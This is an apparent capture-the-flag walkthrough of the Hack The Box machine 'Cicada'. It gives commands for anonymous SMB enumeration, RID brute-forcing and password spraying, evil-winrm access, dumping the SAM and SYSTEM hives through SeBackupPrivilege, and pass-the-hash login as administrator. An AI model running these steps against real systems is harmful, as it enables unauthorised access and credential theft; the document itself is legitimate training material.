# Hack The Box (HTB) - Cicada Walkthrough

## Overview
This guide walks through the process of connecting to a Hack The Box (HTB) machine named **Cicada**, performing enumeration, exploiting SMB shares, and ultimately gaining root access.

## Prerequisites
- OpenVPN installed
- nmap
- smbclient
- evil-winrm
- pypykatz
- netexec

## Steps

### 1. Connecting to HTB
Download and connect to the VPN:
```sh
ls
sudo openvpn <path_to_vpn_file>
```

![image](https://github.com/user-attachments/assets/aef25dc9-ed8f-4d1d-aad2-d6ec0dd95c28)



![image](https://github.com/user-attachments/assets/20d74be9-6273-4c5b-8da1-6e8196bd212c)



![image](https://github.com/user-attachments/assets/c5fc1511-7f98-4bc2-a523-ac7ba34d104d)




### 2. Initial Enumeration
Scan the target machine using **nmap**:
```sh
nmap -sV -sC -T4 -oN Cicada.txt <ip.address>
```


![image](https://github.com/user-attachments/assets/5f0ca176-e151-454c-8207-b92efd203319)



#### Flags Explanation:
- `-sV` : Service/version detection
- `-sC` : Default script scanning
- `-T4` : Aggressive scanning mode
- `-oN Cicada.txt` : Save output to a file

### 3. Add Host to `/etc/hosts`
```sh
echo "<ip.address> cicada.htb CICADA-DC.cicada.htb" | sudo tee -a /etc/hosts
```
Verify the entry:
```sh
cat /etc/hosts
```


![image](https://github.com/user-attachments/assets/17892968-1054-4196-8af8-34d2545100ec)



### 4. SMB Enumeration
List available shares:
```sh
smbclient -N -L //cicada.htb
```
If `smbclient` is not installed:
```sh
sudo apt install smbclient
```

![image](https://github.com/user-attachments/assets/20fcb8eb-9522-4f4c-aa16-b63c4b26c552)



Access the **HR** share:
```sh
smbclient -N //cicada.htb/HR
```
Download files:
```sh
smb: \> get "Notice from HR.txt"
cat 'Notice from HR.txt'
```

### 5. SMB User Enumeration
Brute-force user enumeration:
```sh
nxc smb cicada.htb -u 'anonymous' -p '' --rid-brute 3000
```
Extract usernames and save them:
```sh
nano users.txt
```

Check for valid credentials:
```sh
nxc smb cicada.htb -u users.txt -p '<password_from_notice>'
```
Confirm valid user:
```sh
nxc smb cicada.htb -u 'cicada.htb\michael.wrightson' -p '<password>' --users
```



![image](https://github.com/user-attachments/assets/a1c458e1-d64c-44a9-85ab-8f37ba4fe82e)




### 6. Further SMB Access
Login with the new credentials:
```sh
smbclient //cicada.htb/DEV -U 'cicada.htb\david.orelious'
```
Download the script:
```sh
get Backup_script.ps1
cat Backup_script.ps1
```



![image](https://github.com/user-attachments/assets/a7fec2da-4200-4767-b265-8e0aeb7fc4ef)




### 7. Remote Access via Evil-WinRM
```sh
evil-winrm -i cicada.htb -u '<username>' -p '<password>'
```
Verify access:
```sh
whoami
ls
```




![image](https://github.com/user-attachments/assets/adde7b07-de4e-4713-a3ed-d9b47a903938)



### 8. Extracting Sensitive Files
Move directories:
```sh
cd ..
cd Desktop
```


![image](https://github.com/user-attachments/assets/73afa306-68c1-483b-9d9c-3dd873393a8b)



Read **user.txt**:
```sh
type .\user.txt
```

### 9. Privilege Escalation
Check privileges:
```sh
whoami /priv
```
If **SeBackupPrivilege** is enabled, exploit it:
```sh
mkdir C:\Temp
cd C:\Temp
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
```
Download registry hives:
```sh
download sam
download system
```

### 10. Cracking the Administrator Password
Check if `pypykatz` is installed:
```sh
pip show pypykatz
```
Extract password hashes:
```sh
pypykatz registry --sam sam system
```
Find the **Administrator** hash and use it for authentication:
```sh
evil-winrm -i cicada.htb -u administrator -H <hash_value>
```
Verify access:
```sh
whoami
```
Retrieve the final flag:
```sh
cd ..
cd Desktop
ls
type .\root.txt
```

## Conclusion
By following these steps, we successfully exploited SMB shares, retrieved credentials, escalated privileges, and gained full system access on **Cicada**.
